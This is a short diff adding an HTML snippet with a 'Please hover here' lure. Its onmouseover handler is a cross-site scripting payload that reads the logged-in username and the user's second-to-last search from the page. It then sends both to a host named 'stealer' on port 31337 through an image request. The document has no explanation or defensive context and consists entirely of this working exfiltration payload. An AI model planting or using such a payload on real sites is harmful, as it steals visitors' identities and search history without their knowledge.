@@ -1,0 +1,12 @@
+<div onmouseover="var usernameElement = document.querySelector('#logged-in-user');
+var username = usernameElement ? usernameElement.innerText : 'unknown';
+
+var lastQueryElement = document.querySelectorAll('#history-list a')[1];
+var secondToLastSearch = lastQueryElement ? lastQueryElement.innerText : 'none';
+
+var url = 'http://stealer:31337/?stolen_user=' + encodeURIComponent(username) + '&last_search=' + encodeURIComponent(secondToLastSearch);
+
+var img = new Image();
+img.src = url;">
+Please hover here
+</div>
